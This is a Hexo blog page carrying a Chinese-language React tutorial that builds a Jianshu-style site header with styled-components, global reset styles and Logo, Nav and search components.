<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <title>afei_ask</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="afei_ask">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="afei_ask">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="afei_ask">
  
    <link rel="alternate" href="/atom.xml" title="afei_ask" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">afei_ask</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-react实战1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/18/react实战1/" class="article-date">
  <time datetime="2018-10-18T14:19:18.000Z" itemprop="datePublished">2018-10-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/18/react实战1/">react实战1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="React实战-简书"><a href="#React实战-简书" class="headerlink" title="React实战-简书"></a>React实战-简书</h2><h3 id="一、安装React"><a href="#一、安装React" class="headerlink" title="一、安装React"></a>一、安装React</h3><p>创建名为<code>jiashu</code>的react-app，并且清理工程目录，仅保留index.js、index.css和App.js文件。步骤略。</p>
<h3 id="二、css样式管理"><a href="#二、css样式管理" class="headerlink" title="二、css样式管理"></a>二、css样式管理</h3><h4 id="2-1-react中css使用"><a href="#2-1-react中css使用" class="headerlink" title="2.1 react中css使用"></a>2.1 react中css使用</h4><p>在index.css文件中添加样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dell &#123;</span><br><span class="line">	background:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在App.js文件中，给div添加className，这时页面的div就变成了红色。</p>
<p>注意：并没有给App.js文件引入index.css，只有文件index.js中引用了index.css文件，但是我们在App.js中依然可以使用其中的样式文件。这是因为css文件一旦在一个文件被引入，那么就会全局生效，即全局任何一个文件都能使用这里面的样式。</p>
<p>但是这样容易产生混乱，不建议这么做，这时推荐使用一个第三方的css管理，名为<code>styled-compenents</code></p>
<h4 id="2-2-react中使用styled-compenents管理css"><a href="#2-2-react中使用styled-compenents管理css" class="headerlink" title="2.2 react中使用styled-compenents管理css"></a>2.2 react中使用styled-compenents管理css</h4><p>首先安装该包</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save styled-components</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">yarn add styled-components</span><br></pre></td></tr></table></figure>
<p>然后我们给<code>index.css</code>文件改名为<code>style.js</code>，然后在index.js文件中修改对应的引用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~~ <span class="keyword">import</span> <span class="string">'./index.css'</span>; ~~</span><br><span class="line"><span class="keyword">import</span> <span class="string">'./style.js'</span>;</span><br></pre></td></tr></table></figure>
<p>然后在style.js中如何创建全局样式呢，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; injectGlobal &#125; <span class="keyword">from</span> <span class="string">'styled-components'</span>;</span><br><span class="line">injectGlobal<span class="string">`</span></span><br><span class="line"><span class="string">	body &#123;</span></span><br><span class="line"><span class="string">      margin: 0;</span></span><br><span class="line"><span class="string">      padding: 0;</span></span><br><span class="line"><span class="string">      font-family: sans-serif;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    .dell &#123;</span></span><br><span class="line"><span class="string">        background:red;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>这时再看页面，又能正常显示了。</p>
<p>那么如何数据跟组件一对一的样式呢，后面会有介绍。</p>
<p>由于浏览器的差异，如何做到让不同浏览器的样式统一呢？这时需要用到一个reset.css的文件</p>
<h4 id="2-3-完成浏览器样式的统一"><a href="#2-3-完成浏览器样式的统一" class="headerlink" title="2.3 完成浏览器样式的统一"></a>2.3 完成浏览器样式的统一</h4><p>不同浏览器内核中对body等标签默认样式的设置是不同的，为了代码再所有浏览器上表现是一致的，这就可以使用<a href="https://meyerweb.com/eric/tools/css/reset/" target="_blank" rel="noopener">reset.css</a>，将里面的内容，拷贝到我们的全局样式里面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; injectGlobal &#125; <span class="keyword">from</span> <span class="string">'styled-components'</span>;</span><br><span class="line">injectGlobal<span class="string">`</span></span><br><span class="line"><span class="string">	html, body, div, span, applet, object, iframe,</span></span><br><span class="line"><span class="string">    h1, h2, h3, h4, h5, h6, p, blockquote, pre,</span></span><br><span class="line"><span class="string">    a, abbr, acronym, address, big, cite, code,</span></span><br><span class="line"><span class="string">    del, dfn, em, img, ins, kbd, q, s, samp,</span></span><br><span class="line"><span class="string">    small, strike, strong, sub, sup, tt, var,</span></span><br><span class="line"><span class="string">    b, u, i, center,</span></span><br><span class="line"><span class="string">    dl, dt, dd, ol, ul, li,</span></span><br><span class="line"><span class="string">    fieldset, form, label, legend,</span></span><br><span class="line"><span class="string">    table, caption, tbody, tfoot, thead, tr, th, td,</span></span><br><span class="line"><span class="string">    article, aside, canvas, details, embed, </span></span><br><span class="line"><span class="string">    figure, figcaption, footer, header, hgroup, </span></span><br><span class="line"><span class="string">    menu, nav, output, ruby, section, summary,</span></span><br><span class="line"><span class="string">    time, mark, audio, video &#123;</span></span><br><span class="line"><span class="string">        margin: 0;</span></span><br><span class="line"><span class="string">        padding: 0;</span></span><br><span class="line"><span class="string">        border: 0;</span></span><br><span class="line"><span class="string">        font-size: 100%;</span></span><br><span class="line"><span class="string">        font: inherit;</span></span><br><span class="line"><span class="string">        vertical-align: baseline;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    /* HTML5 display-role reset for older browsers */</span></span><br><span class="line"><span class="string">    article, aside, details, figcaption, figure, </span></span><br><span class="line"><span class="string">    footer, header, hgroup, menu, nav, section &#123;</span></span><br><span class="line"><span class="string">        display: block;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    body &#123;</span></span><br><span class="line"><span class="string">        line-height: 1;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ol, ul &#123;</span></span><br><span class="line"><span class="string">        list-style: none;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    blockquote, q &#123;</span></span><br><span class="line"><span class="string">        quotes: none;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    blockquote:before, blockquote:after,</span></span><br><span class="line"><span class="string">    q:before, q:after &#123;</span></span><br><span class="line"><span class="string">        content: '';</span></span><br><span class="line"><span class="string">        content: none;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    table &#123;</span></span><br><span class="line"><span class="string">        border-collapse: collapse;</span></span><br><span class="line"><span class="string">        border-spacing: 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
<h3 id="三、头部区块的编写"><a href="#三、头部区块的编写" class="headerlink" title="三、头部区块的编写"></a>三、头部区块的编写</h3><p>一般头部区块，是很多页面都要公用的。</p>
<h4 id="3-1-创建header组件"><a href="#3-1-创建header组件" class="headerlink" title="3.1 创建header组件"></a>3.1 创建header组件</h4><p>首先在src目录下创建一个文件夹common，在common文件夹中再创建一个header的文件夹，然后再header文件夹中创建index.js文件，这个就是header的组件。接下来我们来定义这个组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React , &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">            	header</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default Header;</span></span><br></pre></td></tr></table></figure>
<p>然后再<code>src/App.js</code>文件中引入Header组件，并使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> Header <span class="keyword">from</span> <span class="string">'./common/header/index.js'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            &lt;Header /&gt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure>
<h4 id="3-2创建header样式"><a href="#3-2创建header样式" class="headerlink" title="3.2创建header样式"></a>3.2创建header样式</h4><p>在<code>src/common/header/</code>文件夹下，创建一个<code>style.js</code>的样式文件，在里面编写Header自己用的样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">'styled-components'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> HeaderWrapper=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	height:56px;</span></span><br><span class="line"><span class="string">	background:red;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>这样就可以在Header组件(<code>src\common\header\index.js</code>)中，引入该样式并使用了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React , &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;HeaderWrapper&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            &lt;HeaderWrapper&gt;</span><br><span class="line">            	header</span><br><span class="line">            &lt;<span class="regexp">/HeaderWrapper&gt;</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default Header;</span></span><br></pre></td></tr></table></figure>
<p>这时header的简易样式就出来了。</p>
<p>查看简书官网可以看到header有58px高，并且有个1px的边框，可以这么修改</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">height:<span class="number">58</span>px;</span><br><span class="line">border-bottom:1px soid #f0f0f0;</span><br></pre></td></tr></table></figure>
<h4 id="3-3-展示logo"><a href="#3-3-展示logo" class="headerlink" title="3.3 展示logo"></a>3.3 展示logo</h4><p>首先去简书官网，将左上角的logo下载到我们项目的<code>src/state/</code>目录下，命名为<code>logo.png</code>。</p>
<p>接下来我们在<code>src/common/header/style.js</code>中定义一个Logo的组件，由于点击该组件可以进行条状，所以该组件是一个a标签</p>
<p>注意在属性url的不能这么写<code>background:url(&#39;../../statics/logo.png&#39;)</code>因为webpack打包时会当成字符串，而因该使用引用的方式引用该图片，然后使用<code>${}</code>形式进行使用;</p>
<p>图片有点大，还要注意给图片设置大小<code>background-size</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logoPic <span class="keyword">from</span> <span class="string">'../../common/statics/logo.png'</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Logo=styled.a<span class="string">`</span></span><br><span class="line"><span class="string">	position: absolute;</span></span><br><span class="line"><span class="string">	top: 0;</span></span><br><span class="line"><span class="string">	left: 0;</span></span><br><span class="line"><span class="string">	display:block;</span></span><br><span class="line"><span class="string">	width: 100px;</span></span><br><span class="line"><span class="string">	height: 58px;</span></span><br><span class="line"><span class="string">	background:url(<span class="subst">$&#123;logoPic&#125;</span>);</span></span><br><span class="line"><span class="string">	background-size:contain;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>然后就可以在<code>/src/common/header/index.js</code>文件中使用它了，a标签是一个链接，如何让点击时回到首页呢？可以直接给Logo设置<code>href=&quot;/&quot;</code>属性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React , &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; HeaderWrapper , Logo&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">			&lt;HeaderWrapper&gt;</span><br><span class="line">				&lt;Logo href=<span class="string">'/'</span> /&gt;</span><br><span class="line">			&lt;<span class="regexp">/HeaderWrapper&gt;</span></span><br><span class="line"><span class="regexp">        )   </span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default Header;</span></span><br></pre></td></tr></table></figure>
<p>当然也可以在style.js中设置href属性，可以这么写style</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Logo=styled.a.attrs(&#123;</span><br><span class="line">    href:<span class="string">'/'</span></span><br><span class="line">&#125;)<span class="string">`</span></span><br><span class="line"><span class="string">	position: absolute;</span></span><br><span class="line"><span class="string">	top: 0;</span></span><br><span class="line"><span class="string">	left: 0;</span></span><br><span class="line"><span class="string">	display:block;</span></span><br><span class="line"><span class="string">	width: 100px;</span></span><br><span class="line"><span class="string">	height: 58px;</span></span><br><span class="line"><span class="string">	background:url(<span class="subst">$&#123;logoPic&#125;</span>);</span></span><br><span class="line"><span class="string">	background-size:contain;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>然后我们编写header的中间组件</p>
<h4 id="3-4-编写header中间部分Nav"><a href="#3-4-编写header中间部分Nav" class="headerlink" title="3.4 编写header中间部分Nav"></a>3.4 编写header中间部分Nav</h4><p>可以现在<code>/src/common/header/index.js</code>文件中添加一个新组件Nav，再编写</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React , &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; HeaderWrapper , Logo, Nav&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">			&lt;HeaderWrapper&gt;</span><br><span class="line">				&lt;Logo href=<span class="string">'/'</span> /&gt;</span><br><span class="line">            	&lt;Nav /&gt;</span><br><span class="line">			&lt;<span class="regexp">/HeaderWrapper&gt;</span></span><br><span class="line"><span class="regexp">        )   </span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default Header;</span></span><br></pre></td></tr></table></figure>
<p>然后在<code>src/common/header/style.js</code>中定义一个Nav的组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Nav=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	width:960px;</span></span><br><span class="line"><span class="string">	height:100%;</span></span><br><span class="line"><span class="string">	margin:0px;</span></span><br><span class="line"><span class="string">	background:green;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<h4 id="3-5-填充Nav"><a href="#3-5-填充Nav" class="headerlink" title="3.5 填充Nav"></a>3.5 填充Nav</h4><p>这样就能看到我们的中间了，接下来我们往Nav中添加东西，添加4个NavItem，为了给它们添加浮动，给它们添加样式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; HeaderWrapper , Logo , Nav ,NavItem&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line">...</span><br><span class="line">&lt;Nav&gt;</span><br><span class="line">    &lt;NavItem className=<span class="string">'left'</span>&gt;首页&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">    &lt;NavItem className='left'&gt;下载App&lt;/</span>NavItem&gt;</span><br><span class="line">    &lt;NavItem className=<span class="string">'right'</span>&gt;登陆&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">    &lt;NavItem className='right'&gt;Aa&lt;/</span>NavItem&gt;</span><br><span class="line">&lt;<span class="regexp">/Nav&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来我们就能在<code>src/common/header/style.js</code>中定义一个NavItem的组件了，其中<code>&amp;.left</code>表示NavItem组件有left属性的话，就执行向左浮动；</p>
<p>同时它们也有一些共有的属性如line-height、padding、font-size等；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> NavItem=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	line-height:58px;</span></span><br><span class="line"><span class="string">	padding:0 15px;</span></span><br><span class="line"><span class="string">	font-size:17px;</span></span><br><span class="line"><span class="string">    &amp;.left&#123;</span></span><br><span class="line"><span class="string">        float:left;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	&amp;.right&#123;</span></span><br><span class="line"><span class="string">        float:right;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>同时也可以给文字指定颜色，比如让首页为红色，其它设为黑色，右侧文字黑色浅一些：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;NavItem className=<span class="string">'left active'</span>&gt;首页&lt;<span class="regexp">/NavItem&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> NavItem=styled.div<span class="string">`</span></span><br><span class="line"><span class="string">	line-height:58px;</span></span><br><span class="line"><span class="string">	padding:0 15px;</span></span><br><span class="line"><span class="string">	font-size:17px;</span></span><br><span class="line"><span class="string">	color:#333;</span></span><br><span class="line"><span class="string">    &amp;.left&#123;</span></span><br><span class="line"><span class="string">        float:left;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	&amp;.right&#123;</span></span><br><span class="line"><span class="string">        float:right;</span></span><br><span class="line"><span class="string">		color:#969696;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &amp;.active&#123;</span></span><br><span class="line"><span class="string">		color:#ea6f5a;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<h4 id="3-6-编写NavSearch组件"><a href="#3-6-编写NavSearch组件" class="headerlink" title="3.6 编写NavSearch组件"></a>3.6 编写NavSearch组件</h4><p>再Nav中添加NavSearch组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; HeaderWrapper , Logo , Nav ,NavItem, NavSearch&#125; <span class="keyword">from</span> <span class="string">'./style.js'</span>;</span><br><span class="line">...</span><br><span class="line">&lt;Nav&gt;</span><br><span class="line">    &lt;NavItem className=<span class="string">'left'</span>&gt;首页&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">    &lt;NavItem className='left'&gt;下载App&lt;/</span>NavItem&gt;</span><br><span class="line">    &lt;NavItem className=<span class="string">'right'</span>&gt;登陆&lt;<span class="regexp">/NavItem&gt;</span></span><br><span class="line"><span class="regexp">    &lt;NavItem className='right'&gt;Aa&lt;/</span>NavItem&gt;</span><br><span class="line">	&lt;NavSearch&gt;<span class="xml"><span class="tag">&lt;/<span class="name">NavSearch</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/Nav&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在<code>src/common/header/style.js</code>中定义一个NavSearch的组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> NavSearch=styled.input.attrs(&#123;</span><br><span class="line">	placeholder:<span class="string">'搜索'</span></span><br><span class="line">&#125;)<span class="string">`</span></span><br><span class="line"><span class="string">	width:160px;</span></span><br><span class="line"><span class="string">	height:38px;</span></span><br><span class="line"><span class="string">	padding:0 20px;</span></span><br><span class="line"><span class="string">	box-sizing:border-box;</span></span><br><span class="line"><span class="string">	border:none;</span></span><br><span class="line"><span class="string">	outline:none;</span></span><br><span class="line"><span class="string">	margin-top:9px;</span></span><br><span class="line"><span class="string">	margin-left:20px;</span></span><br><span class="line"><span class="string">	border-radius:19px;</span></span><br><span class="line"><span class="string">	background:#eee;</span></span><br><span class="line"><span class="string">	font-size:14px;</span></span><br><span class="line"><span class="string">	&amp;::placeholder&#123;</span></span><br><span class="line"><span class="string">		color:#999;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></table></figure>
<p>其中<code>box-sizing:border-box;</code>    表示input框不拉伸；<code>&amp;::placeholder</code>表示框内文字颜色；</p>
<h4 id="3-7-写注册组件"><a href="#3-7-写注册组件" class="headerlink" title="3.7 写注册组件"></a>3.7 写注册组件</h4><p>首先引入Addition，仔里面添加两个Button然后编写style，通过给Button设置className来自定义属性，相应的再style中可以使用<code>&amp;.XXX</code>来编写对应的样式</p>
